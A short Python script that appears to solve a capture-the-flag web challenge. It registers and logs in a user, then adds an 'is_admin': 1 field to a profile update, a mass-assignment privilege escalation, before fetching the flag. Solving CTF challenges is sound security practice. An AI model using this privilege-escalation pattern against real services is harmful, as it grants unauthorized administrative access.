import requests

session = requests.Session()

username = "satoki00"
password = "password"

res = session.post("http://secure-api.merctf.com:3000/register", json={"username": username, "password": password})
print(f"[/register] {res.text}")

res = session.post("http://secure-api.merctf.com:3000/login", json={"username": username, "password": password})
print(f"[/login] {res.text}")

res = session.post("http://secure-api.merctf.com:3000/profile", json={"username": username, "password": password, "is_admin": 1})
print(f"[/profile] {res.text}")

res = session.post("http://secure-api.merctf.com:3000/login", json={"username": username, "password": password})
print(f"[/login] {res.text}")

res = session.post("http://secure-api.merctf.com:3000/flag")
print(f"[/flag] {res.text}")